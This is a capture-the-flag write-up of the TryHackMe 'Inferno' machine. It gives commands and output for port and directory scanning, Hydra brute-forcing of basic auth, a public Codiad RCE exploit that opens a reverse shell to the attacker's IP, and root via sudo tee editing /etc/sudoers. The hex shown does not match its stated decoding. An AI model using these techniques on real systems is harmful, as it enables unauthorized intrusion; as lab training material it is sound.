<p align="center">
    •<a href="#enumeration">Enumeration</a>•
    <a href="#access">Access</a>•
    <a href="#foothold">Foothold</a>•
    <a href="#user">User</a>•
    <a href="#privilege+escalation">Privilege Escalation</a>•
</p><br>

# Inferno-Writeup-Tryhackme
Writeup of the <a href="https://tryhackme.com/room/inferno" target="_blank">Inferno</a>(made by<a href="https://tryhackme.com/p/mindsflee">@mindsflee</a>) machine on <a href="https://tryhackme.com" targer="_blank">TryHackMe</a>

# Tasks

1. Locate and find local.txt
2. Locate and find proof.txt

# Enumeration

Running a rustscan on the target gives the following result:
<br><strong>rustscan -a 10.10.X.X -- -A -sC -sV -oN scan.txt</strong>

```
# Nmap 7.91 scan initiated Sun Feb 14 17:55:24 2021 as: nmap -vvv -p 21,22,23,25,80,88,106,110,636,750,775,777,779,783,808,873,1001,1178,1210,1236,194,1300,1314,1313,1529,2000,2003,2121,2150,2601,2602,2600,2604,2603,2605,2606,2607,2608,2988,2989,4224,4557,4559,4600,5051,5052,5151,5354,5355,5432,5555,5667,5666,5674,5675,5680,4949,6346,6514,6566,6667,8021,8081,8088,8990,9098,9359,9418,9673,10081,10082,10083,11201,15345,17001,17002,17003,17004,20011,20012,24554,27374,30865,57000,60177,60179 -A -sC -sV -oN scan.txt 10.10.X.X
Nmap scan report for 10.10.X.X
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-02-14 17:55:25 IST for 1691s

PORT      STATE SERVICE          REASON  VERSION
22/tcp    open  ssh              syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
80/tcp    open  http             syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
```
There are many ports open but ssh(22) and http(80) are the only services running.

Tried to bruteforce ssh but no luck :(

Now the http site:<br>
<p align="center"><img src="webimg.png" height="700" width="800" alt="frontpage"></p>
Just lines from Dante's Inferno(canto XXXIV) and the 9 circles of Hell.<br>
Ok, moving on...<br>
Running a gobuster scan on the site gives the following result:<br>
<strong>gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,sh,bin,cgi -t 50</strong><br>

===============================================================<br>
Gobuster v3.0.1<br>
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)<br>
===============================================================<br>
[+] Url:            http://10.10.X.X/<br>
[+] Threads:        50,<br>
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>
[+] Status codes:   200,204,301,302,307,401,403<br>
[+] User Agent:     gobuster/3.0.1<br>
[+] Extensions:     php,html,sh,bin,cgi<br>
[+] Timeout:        10s<br>
===============================================================<br>
2021/02/14 18:11:42 Starting gobuster<br>
===============================================================<br>
/index.html (Status: 200)<br>
/inferno (Status: 401)<br>
/server-status (Status: 403)<br>

There is an interesting directory named <strong>inferno</strong>.
But navigating to it prompts an auth box (Basic Auth).<br>
Since we don't have any credentials bruteforce FTW!<br>
# Access

I shortlisted some possible Usernames:
```
root
admin
dante 
inferno
quanto
durante
```
Bruteforcing with hydra gives the following credentials:<br>
<strong>hydra -L usernames.txt -P ~/rockyou.txt 10.10.X.X http-get /inferno/ -t 64</strong>
```bash
[80][http-get] host: 10.10.X.X   login: admin   password: REDACTED
```
Using the credentials leads to another login page:<br>
<p align="center"><img src="loginpage.png" alt="codiad">
<br></p>
Using the same credentials we can login.<b>Success!</b>
<p align="center"><img src="codiad.png" height="500" width="600" alt="codiad_content"></p>

# Foothold

Looks like it is a web-based IDE framework called <a href="http://codiad.com">codiad</a>.<br>
Using <i>searchsploit</i> we get two exploits:
```
Codiad 2.4.3 - Multiple Vulnerabilities                                                                           | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                               | php/webapps/36371.txt
```
But it is not vulnerable to any of these exploits :( so google for the rescue. Googling "Codiad Exploit" leads us to this <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">RCE vulnerability on Codiad</a>
<br>
We clone the exploit repository into our machine using git clone:
```
git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
cd Codiad-Remote-Code-Execute-Exploit/
```
We can run the exploit:
```
./exploit.py http://admin:REDACTED@10.10.X.X/inferno/ admin REDACTED <MYIP> 4444 linux
```
and <b>Success!</b>.We get a reverse shell:
```
listening on [any] 4445 ...
connect to [MYIP] from (UNKNOWN) [10.10.X.X] 42460
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ 
```

# User

From the shell we are <i>www-data</i>. Not a lot of permissions but we need to pivot to another user with more permissions.<br>
NOTE: The shell kept getting closed for some reason. I didn't know what was actually wrong. Anyway I used screen to keep the reverse shell running even when the shell is closed
```bash
$ screen -S bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm256-color
```
Inside <i>/home/dante</i>, we see the first flag.<br>
```bash
-rw-------  1 dante dante   33 Jan 11 15:22 local.txt
```
But we dont have permission to read it.<br>
Snooping around some more shows some files inside the downloads folder:
```bash
drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
-rw-r--r--  1 root  root     1511 Nov  3 11:52 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11 15:22 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11 15:22 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11 15:22 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11 15:22 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoXX.docx
```
The <i>.download.dat</i> file looks rather interesting.
```bash
www-data@Inferno:/home/dante/Downloads$ file .download.dat 
.download.dat: ASCII text, with very long lines, with no line terminators
```
Looks like it's hexadecimal:
```
49 66 20 79 6f 75 20 61 72 65 20 72 65 61 64 69 6e 67 20 74 68 69 73 2c 20 49 20 68 6f 70 65 20 79 6f 75 20 68 61 76 65 20 61 20 67 72 65 61 74 20 64 61 79 20 6d 79 20 66 72 69 65 6e 64 3b 29 0d 0a
```
Decoding it on <a href="https://www.asciitohex.com">ASCII to Hex</a> gives the following output:
```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:REDACTED
```
The line at the end are ssh credentials. <b>Great!</b>
<br>
```bash
dante@Inferno:/home/dante$ cat local.txt
REDACTED
```
First task Complete!

# Privilege Escalation

Running <i>sudo -l</i> gives the following result:
```
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
Looks like <i>/usr/bin/tee</i> can be run by dante without a password.<br>
Looking at gtfobins gives us the following <a href="https://gtfobins.github.io/gtfobins/tee/">exploit</a> for privilege escalation:
```bash
LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
```
This is really annoying me. I keep getting logged out by the system. Looking at the processes running I found the reason:
```bash
-rw-r--r--  1 root root   1778 Dec  6 14:26 machine_services1320.sh
```
This was the script that kept kicking me out. But I can't delete it cause it's owned by root.<br>

Moving on...

```bash
dante@Inferno:~$ echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
dante ALL=(ALL) NOPASSWD:ALL
dante@Inferno:~$ sudo -i
root@Inferno:~# ls
proof.txt
```
Root at last.

Second task Complete!

# Conclusion

This was my first writeup of anything. I hope it was good. This was a fun box. Although I got stuck at the apache login, I put thought into it and finally rooted the machine. If you have any doubts you can hit me up at @i-am-jezz. <b>Hack The Planet!</b>
